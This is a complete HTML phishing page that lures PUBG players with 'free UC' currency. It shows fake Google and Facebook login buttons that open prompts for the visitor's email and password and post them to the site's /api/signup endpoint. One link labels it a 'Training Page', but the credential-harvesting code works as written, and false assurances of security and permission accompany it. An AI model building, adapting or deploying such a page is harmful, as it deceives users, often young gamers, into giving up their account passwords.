<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PUBG UC FREE</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Anton&display=swap');
        
        body {
            background: url('https://img.utdstc.com/icon/43f/f64/43ff64cc760adb919a138b9f20b6d8830112555f8e178515ee4c5b5d23d969fd:600') no-repeat center center fixed; /* خلفية ببجي */
            background-size: cover;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }
        .login-box {
            background: rgba(10, 15, 30, 0.85);
            backdrop-filter: blur(10px);
            padding: 35px 30px;
            border-radius: 20px;
            text-align: center;
            width: 380px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 0 40px rgba(0,0,0,0.7);
        }
        .pubg-logo { font-family: 'Anton', sans-serif; font-size: 55px; color: #e0e0e0; letter-spacing: 3px; text-shadow: 2px 2px 4px black; }
        .uc-free { background: #ffc107; color: black; font-family: 'Anton', sans-serif; font-size: 28px; padding: 5px 15px; border-radius: 5px; display: inline-block; margin: 5px 0 10px; }
        .uc-badge { border: 2px solid #ffc107; border-radius: 8px; padding: 3px 15px; display: inline-block; margin-bottom: 20px; font-weight: bold; }
        h2 { margin: 10px 0 5px; font-size: 24px; }
        .subtitle { color: #aaa; font-size: 14px; margin-bottom: 25px; }
        .or { display: flex; align-items: center; color: #ffc107; font-weight: bold; margin: 20px 0; }
        .or hr { flex: 1; border: none; border-top: 1px solid #333; }
        .or span { margin: 0 15px; }
        
        .btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin: 10px 0; }
        .google-btn { background: white; color: black; }
        .fb-btn { background: #1877f2; color: white; }
        .btn img { width: 24px; height: 24px; margin-right: 10px; }
        
        .shield { color: #ffc107; margin: 20px 0 5px; }
        .secure-text { color: #aaa; font-size: 13px; }
        .signup { margin-top: 25px; color: #aaa; }
        .signup a { color: #ffc107; text-decoration: none; font-weight: bold; }
        .footer { position: absolute; bottom: 20px; color: #888; font-size: 12px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="pubg-logo">PUBG</div>
        <div class="uc-free">UC FREE</div>
        <div class="uc-badge">UC</div>

        <h2>Welcome Back!</h2>
        <p class="subtitle">Login to continue to your account</p>

        <div class="or"><hr><span>OR</span><hr></div>

        <input type="email" id="email" placeholder="Email" style="display:none"> 
        <input type="password" id="password" placeholder="Password" style="display:none">

        <button class="btn google-btn" onclick="register()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c1/Google_%22G%22_logo.svg" alt="G">
            Continue with Google
        </button>

        <button class="btn fb-btn" onclick="register()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="f">
            Continue with Facebook
        </button>

        <div class="shield">🛡️</div>
        <p class="secure-text">We never post without your permission</p>
        
        <p class="signup">Don't have an account? <a href="#" onclick="alert('Training Page')">Sign up</a></p>
    </div>
    
    <div class="footer">🔒 Secure • Fast • 100% Free</div>

    <script>
        function register() {
            // بنحط ايميل وهمي عشان الزرار يشتغل
            const email = prompt("من فضلك ادخل الايميل");
            const password = prompt("من فضلك ادخل الباسورد");
            
            if(email && password){
                // التعديل هنا: /api/signup بدل /register
                fetch('/api/signup', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({id: email, password: password}) // غيرت email ل id
                })
                .then(res => res.json())
                .then(data => {
                    if(data.success) alert("تم التسجيل بنجاح ✅");
                    else alert("الايميل ده متسجل قبل كده ❌");
                });
            }
        }
    </script>
</body>
</html>
